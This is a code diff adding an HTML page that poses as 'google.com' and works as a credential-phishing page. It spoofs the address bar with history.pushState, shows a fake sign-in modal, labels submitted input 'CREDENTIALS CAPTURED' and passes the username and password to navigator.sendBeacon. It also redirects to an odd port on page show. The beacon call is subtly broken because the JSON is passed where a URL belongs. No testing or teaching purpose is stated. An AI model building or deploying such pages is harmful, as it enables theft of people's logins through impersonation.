@@ -1,0 +1,109 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>google.com</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family:
+          system-ui,
+          -apple-system,
+          sans-serif;
+        background: #fafafa;
+      }
+      .cta {
+        font-size: 16px;
+        padding: 12px 18px;
+        border-radius: 8px;
+        border: 0;
+        background: #0066ff;
+        color: #fff;
+        cursor: pointer;
+      }
+      #modal {
+        display: none;
+        max-width: 400px;
+        margin: 100px auto;
+        background: #ffffff;
+        padding: 28px;
+        border-radius: 12px;
+        box-shadow: 0 15px 50px rgba(0, 0, 0, 0.15);
+        text-align: center;
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        font-size: 14px;
+      }
+      .alert {
+        margin-top: 16px;
+        font-size: 12px;
+        color: #d32f2f;
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div style="text-align: center; margin-top: 80px">
+      <button class="cta" id="btn">Click Here</button>
+    </div>
+
+    <div id="modal">
+      <h2>Sign In</h2>
+      <p>Enter your credentials to continue</p>
+      <input type="text" id="user" placeholder="Username" />
+      <input type="password" id="pass" placeholder="Password" />
+      <button class="cta" onclick="submit()">Sign In</button>
+      <div class="alert" id="alert">CREDENTIALS CAPTURED</div>
+    </div>
+
+    <script>
+      const modal = document.getElementById("modal");
+      const btn = document.getElementById("btn");
+      const alertBox = document.getElementById("alert");
+
+      function submit() {
+        const u = document.getElementById("user").value;
+        const p = document.getElementById("pass").value;
+
+        if (u && p) {
+          alertBox.style.display = "block";
+
+          navigator.sendBeacon(
+            JSON.stringify({
+              username: u,
+              password: p,
+            }),
+          );
+        }
+      }
+
+      btn.onclick = () => {
+        history.pushState(null, "", "/verify");
+
+        btn.remove();
+
+        modal.style.display = "block";
+      };
+
+      window.addEventListener("pageshow", () => {
+        requestAnimationFrame(() => {
+          requestAnimationFrame(() => {
+            setTimeout(() => {
+              location.href = "https://google.com:9090";
+            }, 80);
+          });
+        });
+      });
+    </script>
+  </body>
+</html>
